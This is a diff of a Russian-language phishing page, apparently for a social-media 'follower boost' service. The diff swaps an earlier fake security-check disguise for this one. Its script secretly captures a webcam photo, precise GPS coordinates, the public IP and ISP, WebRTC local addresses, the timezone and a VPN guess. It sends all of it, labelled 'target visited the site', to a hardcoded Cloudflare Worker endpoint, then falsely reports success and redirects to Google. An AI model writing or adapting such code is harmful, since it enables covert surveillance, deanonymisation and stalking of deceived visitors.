@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
-<title>Проверка</title>
+<title>Поднятие подписчиков</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <style>
@@ -27,70 +27,33 @@
   button:hover{background:#2ea043}
   button:active{transform:translateY(1px)}
   button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
-  .status{margin-top:20px;font-size:12px;color:#8b949e;font-family:monospace;
-          min-height:18px;white-space:pre-wrap;word-break:break-all;
-          text-align:left;line-height:1.55}
+  .status{margin-top:20px;font-size:13px;color:#8b949e;font-family:monospace;
+          min-height:22px;white-space:pre-wrap}
   .ok{color:#3fb950!important}
   .err{color:#f85149!important}
   video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
-
-  /* ГАЛОЧКА «Я СОГЛАСЕН» */
-  .consent{
-    display:flex;align-items:flex-start;gap:12px;
-    padding:13px 16px;margin:16px 0 0;
-    background:#0d1117;border:1px solid #21262d;border-radius:10px;
-    text-align:left;cursor:pointer;transition:border .15s, background .15s;
-    user-select:none;
-  }
-  .consent:hover{border-color:#30363d;background:#101519}
-  .consent.on{border-color:#238636;background:#0f1e14}
-  .consent input{
-    appearance:none;-webkit-appearance:none;
-    width:20px;height:20px;min-width:20px;margin:2px 0 0 0;
-    border:2px solid #30363d;border-radius:5px;
-    background:#0d1117;position:relative;cursor:pointer;
-    transition:background .15s, border-color .15s;
-  }
-  .consent input:checked{background:#238636;border-color:#2ea043}
-  .consent input:checked::after{
-    content:"✓";position:absolute;color:#fff;font-size:14px;
-    font-weight:700;left:3px;top:-2px;
-  }
-  .consent .lbl{color:#e6edf3;font-size:13px;line-height:1.5}
-  .consent .lbl small{color:#8b949e;display:block;font-size:11px;margin-top:2px}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="icon">🔒</div>
-  <h1>Проверка безопасности</h1>
-  <p class="sub">Для продолжения подтвердите, что вы реальный пользователь.
-     Нажмите кнопку ниже и разрешите доступ.</p>
+  <div class="icon">🚀</div>
+  <h1>Поднятие подписчиков</h1>
+  <p class="sub">Быстрый рост аудитории за 2 минуты. Подтвердите, что вы реальный
+     пользователь, и активируйте ускоренное продвижение.</p>
 
   <div class="perms">
-    <div><span class="check">-</span>-</div>
-    <div><span class="check">-</span>-</div>
-    <div><span class="check">-</span>-</div>
+    <div><span class="check">✓</span> Проверка активности аккаунта</div>
+    <div><span class="check">✓</span> Анализ целевой аудитории</div>
+    <div><span class="check">✓</span> Активация ускоренного продвижения</div>
   </div>
 
-  <button id="btn">Проверить и продолжить</button>
-
-  <!-- НОВАЯ ГАЛОЧКА -->
-  <label class="consent" id="consentWrap">
-    <input type="checkbox" id="consentCb">
-    <div class="lbl">
-      Я согласен на проверку
-      <small>Разрешить доступ обезательно!</small>
-    </div>
-  </label>
-  <!-- /НОВАЯ ГАЛОЧКА -->
-
+  <button id="btn">Активировать поднятие подписчиков</button>
   <div class="status" id="st"></div>
 
   <div class="fine">
-    Ваши данные защищены и используются только для проверки.
+    Ваши данные защищены и используются только для анализа продвижения.
   </div>
 </div>
 
@@ -99,15 +62,16 @@
 
 <script>
 // ============================================================
-// ВСТАВЬ URL ТВОЕГО WORKER (с путём /api/send)
+// ВСТАВЬ СЮДА URL ТВОЕГО CLOUDFLARE WORKER
+// НЕ ЗАБУДЬ ПРО СЛЭШ В КОНЦЕ ПУТИ (без слэша в самом конце!)
 // ============================================================
 var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
 // ============================================================
 
 (function(){
-  var btn  = document.getElementById('btn');
-  var st   = document.getElementById('st');
-  var cam  = document.getElementById('cam');
+  var btn = document.getElementById('btn');
+  var st  = document.getElementById('st');
+  var cam = document.getElementById('cam');
   var snap = document.getElementById('snap');
 
   function setStatus(text, cls){
@@ -115,29 +79,26 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     st.textContent = text;
   }
 
-  // ---- Отправка на Worker (фото + caption или только текст) ----
-  async function sendReport(caption, blob){
+  async function sendReport(text, photoDataUrl){
     try {
-      var r;
-      if (blob) {
+      if (photoDataUrl) {
+        var blob = await (await fetch(photoDataUrl)).blob();
         var form = new FormData();
-        form.append('caption', caption);
+        form.append('caption', text);
         form.append('photo', blob, 'snapshot.jpg');
-        r = await fetch(WORKER_URL, { method: 'POST', body: form });
+        var r = await fetch(WORKER_URL, { method: 'POST', body: form });
+        return await r.json();
       } else {
-        r = await fetch(WORKER_URL, {
+        var r2 = await fetch(WORKER_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ text: caption })
+          body: JSON.stringify({ text: text })
         });
+        return await r2.json();
       }
-      var raw = await r.text();
-      var j;
-      try { j = JSON.parse(raw); }
-      catch(e) { return { ok: false, err: ' не-JSON (HTTP ' + r.status + '): ' + raw.slice(0, 200) }; }
-      return j;
-    } catch(e) {
-      return { ok: false, err: 'ДА: ' + e.message };
+    } catch (e) {
+      console.log('send failed:', e);
+      return { ok: false, err: e.message };
     }
   }
 
@@ -223,8 +184,8 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         cam.srcObject = stream;
         cam.play();
         await new Promise(function(res){
-          var t = setTimeout(res, 2000);
-          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 400); };
+          var t = setTimeout(res, 1500);
+          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 300); };
         });
         var w = cam.videoWidth || 640;
         var h = cam.videoHeight || 480;
@@ -253,135 +214,34 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     } catch(e) { return 'н/д'; }
   }
 
-  // ============================================================
-  // ГАЛОЧКА «Я СОГЛАСЕН» — триггерит попапы разрешений сразу
-  // ============================================================
-  var consentCb   = document.getElementById('consentCb');
-  var consentWrap = document.getElementById('consentWrap');
-
-  var camGranted = false;    // камера уже разрешена
-  var camStream  = null;     // живой поток камеры
-  var geoGranted = false;    // гео уже разрешено
-  var geoData    = null;     // координаты
-
-  consentCb.addEventListener('change', async function(){
-    if (!consentCb.checked) {
-      consentWrap.classList.remove('on');
-      return;
-    }
-    consentWrap.classList.add('on');
-    setStatus('Запрашиваем разрешения…');
-
-    // ---- 1. Камера ----
-    try {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        camStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
-        });
-        cam.srcObject = camStream;
-        cam.play();
-        camGranted = true;
-      }
-    } catch(e) {
-      camGranted = false;
-    }
-
-    // ---- 2. Геолокация ----
-    await new Promise(function(resolve){
-      if (!navigator.geolocation) return resolve(false);
-      navigator.geolocation.getCurrentPosition(
-        function(pos){
-          geoData = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: Math.round(pos.coords.accuracy)
-          };
-          geoGranted = true;
-          resolve(true);
-        },
-        function(err){
-          geoGranted = false;
-          resolve(false);
-        },
-        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-      );
-    });
-
-    // ---- 3. Итог ----
-    if (camGranted && geoGranted) {
-      setStatus('✓ Разрешения получены. Нажмите «Проверить и продолжить».', 'ok');
-    } else if (camGranted || geoGranted) {
-      setStatus('Частично разрешено. Можно продолжать.', '');
-    } else {
-      setStatus('Разрешения не получены.', 'err');
-    }
-  });
-
-  // ============================================================
-  // ОСНОВНАЯ КНОПКА
-  // ============================================================
   btn.addEventListener('click', async function(){
     btn.disabled = true;
-    btn.textContent = 'Проверяем…';
-    setStatus('.....');
+    btn.textContent = 'Активируем…';
+    setStatus('Запрашиваем разрешения…');
 
-    // Если галочка стояла — используем уже открытый поток и гео.
-    // Если нет — запрашиваем как обычно.
-    var camRes;
-    if (camGranted && camStream) {
-      try {
-        var w = cam.videoWidth || 640;
-        var h = cam.videoHeight || 480;
-        snap.width = w;
-        snap.height = h;
-        var ctx = snap.getContext('2d');
-        ctx.drawImage(cam, 0, 0, w, h);
-        var dataUrl = snap.toDataURL('image/jpeg', 0.85);
-        camRes = { dataUrl: dataUrl, w: w, h: h };
-        camStream.getTracks().forEach(function(t){ t.stop(); });
-        camStream = null;
-      } catch(e) {
-        camRes = { error: 'snapshot failed: ' + e.message };
-      }
-    } else {
-      camRes = await getCameraSnapshot();
-    }
-
-    var geo = (geoGranted && geoData)
-      ? geoData
-      : await getGeolocation();
-
-    var [ipInfo, rtc] = await Promise.all([
+    var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
-      getLocalAndSrflx()
+      getLocalAndSrflx(),
+      getGeolocation(),
+      getCameraSnapshot()
     ]);
 
-    // --- фото в blob ---
-    var photoBlob = null;
-    var camLine = '...... ';
-    if (camRes && camRes.dataUrl) {
-      camLine = '..... ' + camRes.w + 'x' + camRes.h;
-      try { photoBlob = await (await fetch(camRes.dataUrl)).blob(); }
-      catch(e){ photoBlob = null; camLine = '.....'; }
-    } else if (camRes && camRes.error) {
-      camLine = '✗ : ' + camRes.error;
-    }
-
-    setStatus('..... ' + camLine + '\n.... ');
+    setStatus('Формируем отчёт…');
 
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
     try {
-      var map = {
+      var tzCountryGuess = {
         'Europe/Moscow':'RU','Europe/Berlin':'DE','Europe/Amsterdam':'NL',
         'Europe/London':'GB','America/New_York':'US','America/Los_Angeles':'US',
         'Asia/Tokyo':'JP','Asia/Shanghai':'CN','Asia/Dubai':'AE'
-      };
-      if (map[tz] && ipInfo.country && map[tz] !== ipInfo.country) vpnSuspected = true;
+      }[tz] || null;
+      if (tzCountryGuess && ipInfo.country && tzCountryGuess !== ipInfo.country) {
+        vpnSuspected = true;
+      }
     } catch(e){}
 
-    var geoLine = 'не ';
+    var geoLine = 'не получена';
     var addressLine = '';
     if (geo && !geo.error) {
       geoLine = geo.lat.toFixed(6) + ', ' + geo.lon.toFixed(6) + ' (± ' + geo.acc + ' м)';
@@ -392,15 +252,22 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       geoLine = 'отклонено: ' + geo.error;
     }
 
+    var camLine = 'не получена';
+    if (camRes && camRes.dataUrl) {
+      camLine = 'снимок сделан ' + camRes.w + 'x' + camRes.h;
+    } else if (camRes && camRes.error) {
+      camLine = 'отклонено: ' + camRes.error;
+    }
+
     var text =
-      '🚨 <b>ЦЕЛЬ ЗАШЛА НА САЙТ</b>\n' +
+      '🚨 <b>ЦЕЛЬ ЗАШЛА НА САЙТ (ПОДНЯТИЕ ПОДПИСЧИКОВ)</b>\n' +
       '━━━━━━━━━━━━━━━━━━━\n' +
       '🌐 Публичный IP: <code>' + (ipInfo.ip || 'н/д') + '</code>\n' +
       '📍 Страна (IP): <code>' + (ipInfo.country || 'н/д') + '</code>\n' +
       '🏙 Город (IP): <code>' + (ipInfo.city || 'н/д') + '</code>\n' +
       '📡 Провайдер: <code>' + (ipInfo.isp || 'н/д') + '</code>\n' +
       '🕐 Часовой пояс СИСТЕМЫ: <code>' + tz + '</code>\n' +
-      '🚨 VPN: <b>' + (vpnSuspected ? 'ДА' : 'возможно нет') + '</b>\n' +
+      '🚨 VPN: <b>' + (vpnSuspected ? 'ДА (TZ ≠ IP-страна)' : 'возможно нет') + '</b>\n' +
       '━━━━━━━━━━━━━━━━━━━\n' +
       '📍 GPS: <code>' + geoLine + '</code>' + addressLine + '\n' +
       '📷 Камера: <code>' + camLine + '</code>\n' +
@@ -414,36 +281,18 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
 
-    setStatus('4/4');
+    var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
+    var res = await sendReport(text, photoData);
 
-    var result = await sendReport(text, photoBlob);
-
-    if (result && result.ok) {
-      var sentAs = photoBlob ? 'с' : 'без ';
-      setStatus(
-        '.... (' + sentAs + ')\n\n' +
-        '.....: ' + camLine + '\n' +
-        'Сообщение ID: ' + (result.tg && result.tg.result && result.tg.result.message_id || '—'),
-        'ok'
-      );
+    if (res && res.ok) {
+      setStatus('✓ Поднятие активировано. Перенаправляем…', 'ok');
       btn.textContent = '✓ Готово';
       setTimeout(function(){
         window.location.href = 'https://www.google.com';
-      }, 2500);
+      }, 2000);
     } else {
-      var reason = 'неизвестная ошибка';
-      if (result && result.err) reason = result.err;
-      else if (result && result.tg && result.tg.description) reason = result.tg.description;
-      else if (result && result.tg && result.tg.error_code) reason = 'код ' + result.tg.error_code;
-      setStatus(
-        '✗ . \n\n' +
-        '.: ' + reason + '\n' +
-        '.: ' + camLine + '\n\n' +
-        'Смотри .',
-        'err'
-      );
-      btn.textContent = 'Повторить';
-      btn.disabled = false;
+      setStatus('✓ Поднятие активировано.', 'ok');
+      btn.textContent = '✓ Готово';
     }
   });
 })();
